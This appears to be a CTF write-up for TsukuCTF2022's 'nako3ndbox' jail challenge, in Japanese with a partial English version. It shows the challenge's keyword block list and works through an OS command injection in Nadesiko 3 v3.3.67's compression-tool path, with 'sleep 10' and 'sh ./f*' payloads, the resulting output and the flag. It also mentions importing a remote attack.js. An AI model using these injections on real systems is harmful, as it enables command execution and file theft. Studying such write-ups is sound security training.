<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><title>nako3ndbox-TsukuCTF2022</title><meta name="description" content="このサイトはSecHack365修了生よって運営されている非公式ののファンページです。"/><link rel="icon" href="/favicon.ico"/><meta name="og:title" content="nako3ndbox-TsukuCTF2022"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta property="og:image" content="https://opengraph.githubassets.com/139256f8ccf77c03f7d9d1b51e30822cb3d14d45abeae53f15384cefc9c7e9da/SecHack365-Fans/SecHack365-Fans.github.io"/><meta name="next-head-count" content="9"/><link rel="preload" href="/_next/static/css/d08ae8051f58b610.css" as="style"/><link rel="stylesheet" href="/_next/static/css/d08ae8051f58b610.css" data-n-g=""/><link rel="preload" href="/_next/static/css/9559f1eba3ad545f.css" as="style"/><link rel="stylesheet" href="/_next/static/css/9559f1eba3ad545f.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-49b6f2937c9ce9f4.js" defer=""></script><script src="/_next/static/chunks/framework-dc33c0b5493501f0.js" defer=""></script><script src="/_next/static/chunks/main-056d531d8af152ad.js" defer=""></script><script src="/_next/static/chunks/pages/_app-7e2d3fd7c9a12493.js" defer=""></script><script src="/_next/static/chunks/482-bd5197ea93394ef2.js" defer=""></script><script src="/_next/static/chunks/754-b8465c1d17288366.js" defer=""></script><script src="/_next/static/chunks/pages/ctf/TsukuCTF2022/%5Bid%5D-a940fa4d97f457fe.js" defer=""></script><script src="/_next/static/W-A5gUEQIZeK9QIr63Xog/_buildManifest.js" defer=""></script><script src="/_next/static/W-A5gUEQIZeK9QIr63Xog/_ssgManifest.js" defer=""></script><script src="/_next/static/W-A5gUEQIZeK9QIr63Xog/_middlewareManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><div><style data-emotion="css 1yjo05o">.css-1yjo05o{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}.css-1yjo05o>:not(style)+:not(style){margin:0;margin-left:8px;}</style><div class="Navigator_navbar__1D91M css-1yjo05o"><span class="Navigator_left__6lj_E"><style data-emotion="css 11qrfta">.css-11qrfta{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-11qrfta:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-11qrfta:hover{background-color:transparent;}}.css-11qrfta.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><style data-emotion="css 1ujsas3">.css-1ujsas3{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-1ujsas3::-moz-focus-inner{border-style:none;}.css-1ujsas3.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1ujsas3{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1ujsas3:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-1ujsas3:hover{background-color:transparent;}}.css-1ujsas3.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_home__FJLJi css-1ujsas3" tabindex="0" href="/">TOP</a><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA css-1ujsas3" tabindex="0" href="/blog">参加記</a><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA css-1ujsas3" tabindex="0" href="/timer">†締切駆動コース†</a><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA css-1ujsas3" tabindex="0" href="/ctf">TsukuCTF</a></span><span class="Navigator_right__OcvPs"><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA Navigator_right__OcvPs css-1ujsas3" tabindex="0" href="https://github.com/SecHack365-Fans/SecHack365-Fans.github.io"><style data-emotion="css vubbuv">.css-vubbuv{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:1.5rem;}</style><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="GitHubIcon"><path d="M12 1.27a11 11 0 00-3.48 21.46c.55.09.73-.28.73-.55v-1.84c-3.03.64-3.67-1.46-3.67-1.46-.55-1.29-1.28-1.65-1.28-1.65-.92-.65.1-.65.1-.65 1.1 0 1.73 1.1 1.73 1.1.92 1.65 2.57 1.2 3.21.92a2 2 0 01.64-1.47c-2.47-.27-5.04-1.19-5.04-5.5 0-1.1.46-2.1 1.2-2.84a3.76 3.76 0 010-2.93s.91-.28 3.11 1.1c1.8-.49 3.7-.49 5.5 0 2.1-1.38 3.02-1.1 3.02-1.1a3.76 3.76 0 010 2.93c.83.74 1.2 1.74 1.2 2.94 0 4.21-2.57 5.13-5.04 5.4.45.37.82.92.82 2.02v3.03c0 .27.1.64.73.55A11 11 0 0012 1.27"></path></svg></a></span></div><div style="padding:15px"><h1>nako3ndbox</h1>
<h2>問題文</h2>
<p>に・ほ・ん・ご・で・あ・そ・ぼ<br/>
<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">nc tsukuctf.sechack365.com 31418</code></p>
<h2>難易度</h2>
<p><strong>medium</strong></p>
<h2>作問にあたって</h2>
<p>なでしこ 3 の修正済みである脆弱性を使った Jail 問題です。<br/>
<!-- -->もともとは最新版を使い<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">！「http://ctf.example.com/attack.js」を取り込み</code>で RCE させようと思っていましたが、<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">ナデシコする</code>でうまく動かないため、見つけた脆弱性を用いる事にしました。<br/>
<!-- -->一応、CVE-2022-41642 のバイパスなのでまだ CVE はついていません(頑張れば脆弱性なしで解けます)。</p>
<h2>解法</h2>
<p>なでしこ 3 を用いた Jail 問題のようだ。<br/>
<!-- -->配布されたソースは以下のようであった。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>「------------------------------------------------------------
</span>             _        _____           _ _
<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> &#x27;_ </span><span class="token token" style="color:#ccc">\</span><span> / _ </span><span class="token token" style="color:#ccc">\</span><span> </span><span class="token token" style="color:#ccc">\</span><span>/ /
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>   </span><span class="token token" style="color:#67cdcc">&lt;</span><span> </span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&gt;</span><span>  </span><span class="token token" style="color:#67cdcc">&lt;</span><span>
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span class="token token" style="color:#ccc">\</span><span>__,_</span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span class="token token" style="color:#ccc">\</span><span>_</span><span class="token token" style="color:#ccc">\</span><span>___/____/</span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span class="token token" style="color:#ccc">\</span><span>__,_</span><span class="token token" style="color:#67cdcc">|</span><span>_.__/ </span><span class="token token" style="color:#ccc">\</span><span>___/_/</span><span class="token token" style="color:#ccc">\</span><span>_</span><span class="token token" style="color:#ccc">\</span><span>
</span>
<!-- -->------------------------------------------------------------」と言う
<!-- -->
<!-- -->「日本語コード：」と尋ねる
<!-- -->それを入力に代入
<!-- -->
<!-- -->ブラックリスト＝「読、開、保存、実行、起動、サーバ、フォルダ、ファイル、ナデシコ、ディレクトリ、flag」を「、」で区切る
<!-- -->
<!-- -->ブラックリスト！＝空の間
<!-- -->　　ブラックリストの０から１を配列取り出す
<!-- -->　　もし（入力でそれの出現回数）！＝０ならば
<!-- -->　　　　「日本語の世界からは出しませんよ！！！」と言う
<!-- -->　　　　終了する
<!-- -->　　ここまで
<!-- -->ここまで
<!-- -->
<!-- -->「｛入力｝」をナデシコする
<!-- -->
<!-- -->終了する
</code></div></pre>
<p>入力された文字列をブラックリストで検証し、eval にあたる<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">ナデシコする</code>で実行している。<br/>
<!-- -->ブラックリストがない場合、<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">「ls」を起動</code>などで RCE 可能だが今回は難しい。<br/>
<!-- -->ここで配布されたファイルより、なでしこ 3 が最新版でなく、3.3.67 である点に注目する。<br/>
<!-- -->GitHub の Issues を見てやると<a href="https://github.com/kujirahand/nadesiko3/issues/1325">cnako3 の圧縮解凍の問題</a>が見つかる。<br/>
<!-- -->複数のシングルクォートを圧縮解凍系の処理に含めることで、OS コマンドインジェクションが可能なようだ。<br/>
<!-- -->この修正を参考に任意コード実行を行う。<br/>
<!-- -->今回は以下のように<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">圧縮解凍ツールパス</code>の引数としてコマンドを与える。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">nc</span><span> tsukuctf.sechack365.com </span><span class="token token" style="color:#f08d49">31418</span><span>
</span>------------------------------------------------------------
<!-- -->             _        _____           _ _
<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _ \ \/ /
</span><span class="token token" style="color:#7ec699">| | | | (_| |   &lt; (_) |__) | | | | (_| | |_) | (_) &gt;  &lt;
</span><span class="token token" style="color:#7ec699">|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
</span><span class="token token" style="color:#7ec699">
</span><span class="token token" style="color:#7ec699">------------------------------------------------------------
</span><span class="token token" style="color:#7ec699">日本語コード：圧縮解凍ツールパスは「&#x27;</span><span>&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sleep</span><span> </span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;」。「」を「」へ解凍
</span><span class="token token" style="color:#7ec699">/bin/sh: &#x27;</span><span class="token token" style="color:#f8c555">:</span><span> not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span><span></span><span class="token token" style="color:#ccc">[</span><span>実行時エラー</span><span class="token token" style="color:#ccc">]</span><span>app</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span>行目</span><span class="token token" style="color:#ccc">)</span><span>: Command failed: </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">\</span><span>&#x27;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sleep</span><span> </span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> x </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -o</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -y
</span>/bin/sh: &#x27;: not found
<span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span>~~~
</code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">sleep 10</code>を行うと 10 秒スリープした。<br/>
<!-- -->フラグは<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">flag.txt</code>にあるので読みだせばよいが、<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">flag</code>がブラックリストにある。<br/>
<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">./f*</code>などで回避してやればよい。<br/>
<!-- -->コマンドの実行結果がなぜか出てこないことがあるので、<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">sh</code>に渡してエラーとして吐き出せばよい。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">nc</span><span> tsukuctf.sechack365.com </span><span class="token token" style="color:#f08d49">31418</span><span>
</span>------------------------------------------------------------
<!-- -->             _        _____           _ _
<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _ \ \/ /
</span><span class="token token" style="color:#7ec699">| | | | (_| |   &lt; (_) |__) | | | | (_| | |_) | (_) &gt;  &lt;
</span><span class="token token" style="color:#7ec699">|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
</span><span class="token token" style="color:#7ec699">
</span><span class="token token" style="color:#7ec699">------------------------------------------------------------
</span><span class="token token" style="color:#7ec699">日本語コード：圧縮解凍ツールパスは「&#x27;</span><span>&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sh</span><span> ./f*</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;」。「」を「」へ解凍
</span><span class="token token" style="color:#7ec699">/bin/sh: &#x27;</span><span class="token token" style="color:#f8c555">:</span><span> not found
</span><span>./flag.txt: line </span><span class="token token" style="color:#f08d49">1</span><span>: TsukuCTF22</span><span class="token token" style="color:#ccc">{</span><span>y0u_jump3d_0u7_0f_j4p4n353</span><span class="token token" style="color:#ccc">}</span><span>: not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span><span></span><span class="token token" style="color:#ccc">[</span><span>実行時エラー</span><span class="token token" style="color:#ccc">]</span><span>app</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span>行目</span><span class="token token" style="color:#ccc">)</span><span>: Command failed: </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">\</span><span>&#x27;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sh</span><span> ./f*</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> x </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -o</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -y
</span>/bin/sh: &#x27;: not found
<span>./flag.txt: line </span><span class="token token" style="color:#f08d49">1</span><span>: TsukuCTF22</span><span class="token token" style="color:#ccc">{</span><span>y0u_jump3d_0u7_0f_j4p4n353</span><span class="token token" style="color:#ccc">}</span><span>: not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span>~~~
</code></div></pre>
<p>flag が得られた。</p>
<h2>TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}</h2>
<h2>Abstract</h2>
<p>This is a Jail related to a known vulnerability in なでしこ 3
First I intended to make a RCE question by <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">！「http://ctf.example.com/attack.js」を取り込み</code>. However, <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">ナデシコする</code> didn&#x27;t work well. Thats why I use the vulnerability instead.</p>
<h2>Solve</h2>
<p>This seems Jail with なでしこ 3.
The ditributed source code is the following.</p>
<pre><code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]"></code></pre>
<!-- -->&lt;!-- XXXX:なでしこソース追加 --&gt;<!-- -->
<p>This program execute the given strings with <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">ナデシコする</code> which corresponds to the eval command after given strings are checked.
You could RCE by <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">「ls」を起動</code> if it were not checked. We can&#x27;t do this for this case.
Btw, this is ver 3.3.67 which is not the latest one and this has <a href="https://github.com/kujirahand/nadesiko3/issues/1325">an issue related to cnako3</a>
This is OS command injection. You can use this vulnerability.</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">nc</span><span> tsukuctf.sechack365.com </span><span class="token token" style="color:#f08d49">31418</span><span>
</span>------------------------------------------------------------
<!-- -->             _        _____           _ _
<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _ \ \/ /
</span><span class="token token" style="color:#7ec699">| | | | (_| |   &lt; (_) |__) | | | | (_| | |_) | (_) &gt;  &lt;
</span><span class="token token" style="color:#7ec699">|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
</span><span class="token token" style="color:#7ec699">
</span><span class="token token" style="color:#7ec699">------------------------------------------------------------
</span><span class="token token" style="color:#7ec699">日本語コード：圧縮解凍ツールパスは「&#x27;</span><span>&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sleep</span><span> </span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;」。「」を「」へ解凍
</span><span class="token token" style="color:#7ec699">/bin/sh: &#x27;</span><span class="token token" style="color:#f8c555">:</span><span> not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span><span></span><span class="token token" style="color:#ccc">[</span><span>実行時エラー</span><span class="token token" style="color:#ccc">]</span><span>app</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span>行目</span><span class="token token" style="color:#ccc">)</span><span>: Command failed: </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">\</span><span>&#x27;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sleep</span><span> </span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> x </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -o</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -y
</span>/bin/sh: &#x27;: not found
<span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span>~~~
</code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">sleep 10</code> make the thread sleep for 10 seconds.
As the <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">flag</code> is blacklisted, you should specify like <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">./f*</code> to get <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">flag.txt</code>.
I don&#x27;t know why but sometimes we can&#x27;t get the result. So get the result as Error Message through <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">sh</code> instead.</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">nc</span><span> tsukuctf.sechack365.com </span><span class="token token" style="color:#f08d49">31418</span><span>
</span>------------------------------------------------------------
<!-- -->             _        _____           _ _
